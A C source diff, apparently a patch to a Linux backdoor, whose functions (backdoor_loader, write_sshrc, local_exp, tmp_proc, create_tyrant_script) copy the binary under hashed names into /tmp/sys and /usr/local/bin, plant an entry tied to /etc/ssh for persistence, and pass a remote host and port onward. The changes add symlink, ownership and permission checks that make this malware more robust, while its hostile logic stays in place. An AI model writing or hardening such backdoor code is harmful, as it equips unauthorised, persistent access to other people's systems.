@@ -133,14 +133,15 @@ void backdoor_loader(void) {
   }
   src_path[len] = '\0';
 
-  int src_fd = open(src_path, O_RDONLY);
+  int src_fd = open(src_path, O_RDONLY | O_NOFOLLOW);
   if (src_fd == -1) {
     perror("open");
     free(random_md5);
     exit(EXIT_FAILURE);
   }
 
-  int dst_fd = open(destination, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+  /* Use O_NOFOLLOW to prevent symlink attacks and O_EXCL to prevent race conditions */
+  int dst_fd = open(destination, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0700);
   if (dst_fd == -1) {
     perror("open");
     close(src_fd);
@@ -343,7 +344,10 @@ void write_sshrc(char * md5_name) {
   if (md5_name == NULL || !is_valid_md5(md5_name)) {
     return;
   }
-  create_directory_if_needed("/etc/ssh");
+  if (create_directory_if_needed("/etc/ssh") != 0) {
+    fprintf(stderr, "[!] Failed to create or validate /etc/ssh directory\n");
+    return;
+  }
 
   char line[PATH_MAX];
   snprintf(line, sizeof(line), "/tmp/sys/%s", md5_name);
@@ -391,13 +395,61 @@ int create_directory_if_needed(const char * dir_path) {
   struct stat st = {
     0
   };
-  if (stat(dir_path, & st) == -1) {
+  /* Use lstat to not follow symlinks - prevents attacker-controlled symlink attacks */
+  if (lstat(dir_path, & st) == -1) {
+    /* Directory doesn't exist, create it with restrictive permissions */
     if (mkdir(dir_path, 0700) == -1) {
+      perror("[!] Failed to create directory");
       return -1;
     }
 
+    /* Verify the directory was created with correct permissions */
     if (chmod(dir_path, 0700) == -1) {
+      perror("[!] Failed to set directory permissions");
       return -1;
+    }
+    
+    /* Verify ownership is root when running with privileges */
+    if (geteuid() == 0) {
+      if (chown(dir_path, 0, 0) == -1) {
+        perror("[!] Failed to set directory ownership to root");
+        return -1;
+      }
+    }
+  } else {
+    /* Path exists - validate it's safe to use */
+    
+    /* Check 1: Must not be a symlink */
+    if (S_ISLNK(st.st_mode)) {
+      fprintf(stderr, "[!] Security violation: %s is a symlink, refusing to use it\n", dir_path);
+      return -1;
+    }
+    
+    /* Check 2: Must be a directory */
+    if (!S_ISDIR(st.st_mode)) {
+      fprintf(stderr, "[!] Security violation: %s exists but is not a directory\n", dir_path);
+      return -1;
+    }
+    
+    /* Check 3: When running with elevated privileges, must be owned by root */
+    if (geteuid() == 0 && st.st_uid != 0) {
+      fprintf(stderr, "[!] Security violation: %s is not owned by root (owner: %d)\n", dir_path, st.st_uid);
+      return -1;
+    }
+    
+    /* Check 4: Must have restrictive permissions (no group/other write) */
+    if ((st.st_mode & (S_IWGRP | S_IWOTH)) != 0) {
+      fprintf(stderr, "[!] Security violation: %s has insecure permissions (mode: %o)\n", dir_path, st.st_mode & 0777);
+      return -1;
+    }
+    
+    /* Check 5: Ensure permissions are exactly 0700 for maximum security */
+    if ((st.st_mode & 0777) != 0700) {
+      /* Attempt to fix permissions */
+      if (chmod(dir_path, 0700) == -1) {
+        fprintf(stderr, "[!] Failed to fix permissions on %s\n", dir_path);
+        return -1;
+      }
     }
   }
   return 0;
@@ -512,7 +564,11 @@ void local_exp(const char * path) {
     0
   };
 
-  create_directory_if_needed("/tmp/sys");
+  /* Validate /tmp/sys directory is secure before proceeding */
+  if (create_directory_if_needed("/tmp/sys") != 0) {
+    fprintf(stderr, "[!] Failed to create or validate /tmp/sys directory - aborting for security\n");
+    return;
+  }
 
   char * self_hash = get_file_hash(path);
   if (self_hash == NULL) {
@@ -542,7 +598,7 @@ void local_exp(const char * path) {
       char new_file_path[PATH_MAX];
       snprintf(new_file_path, sizeof(new_file_path), "/tmp/sys/%s", random_cli_hash);
 
-      int src_fd = open(path, O_RDONLY);
+      int src_fd = open(path, O_RDONLY | O_NOFOLLOW);
       if (src_fd == -1) {
         perror("open source file");
         free(random_cli_hash);
@@ -550,7 +606,8 @@ void local_exp(const char * path) {
         return;
       }
 
-      int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+      /* Use O_NOFOLLOW to prevent symlink attacks and O_EXCL to prevent race conditions */
+      int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0700);
       if (dst_fd == -1) {
         perror("open destination file");
         close(src_fd);
@@ -631,7 +688,7 @@ void tmp_proc(const char * path, int id,
     char new_file_path[PATH_MAX];
     snprintf(new_file_path, sizeof(new_file_path), "/usr/local/bin/%s", random_cli_hash);
 
-    int src_fd = open(path, O_RDONLY);
+    int src_fd = open(path, O_RDONLY | O_NOFOLLOW);
     if (src_fd == -1) {
       perror("open source file");
       free(random_cli_hash);
@@ -639,7 +696,8 @@ void tmp_proc(const char * path, int id,
       return;
     }
 
-    int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
+    /* Use O_NOFOLLOW to prevent symlink attacks and O_EXCL to prevent race conditions */
+    int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0700);
     if (dst_fd == -1) {
       perror("open destination file");
       close(src_fd);
@@ -879,6 +937,39 @@ void check_program_directory(int target_uid,
       perror("stat failed");
     }
   } else if (strcmp(dir, "/tmp/sys") == 0) {
+    /* Validate /tmp/sys directory security before executing from it */
+    struct stat dir_stat;
+    if (lstat("/tmp/sys", &dir_stat) == -1) {
+      fprintf(stderr, "[!] Failed to stat /tmp/sys directory\n");
+      free(path_copy);
+      return;
+    }
+    
+    /* Security checks for /tmp/sys directory */
+    if (S_ISLNK(dir_stat.st_mode)) {
+      fprintf(stderr, "[!] Security violation: /tmp/sys is a symlink, refusing to execute\n");
+      free(path_copy);
+      return;
+    }
+    
+    if (!S_ISDIR(dir_stat.st_mode)) {
+      fprintf(stderr, "[!] Security violation: /tmp/sys is not a directory\n");
+      free(path_copy);
+      return;
+    }
+    
+    if (geteuid() == 0 && dir_stat.st_uid != 0) {
+      fprintf(stderr, "[!] Security violation: /tmp/sys is not owned by root (owner: %d)\n", dir_stat.st_uid);
+      free(path_copy);
+      return;
+    }
+    
+    if ((dir_stat.st_mode & (S_IWGRP | S_IWOTH)) != 0) {
+      fprintf(stderr, "[!] Security violation: /tmp/sys has insecure permissions (mode: %o)\n", dir_stat.st_mode & 0777);
+      free(path_copy);
+      return;
+    }
+    
     create_tyrant_script();
     tmp_proc(path, target_uid, rhost, rport);
   }
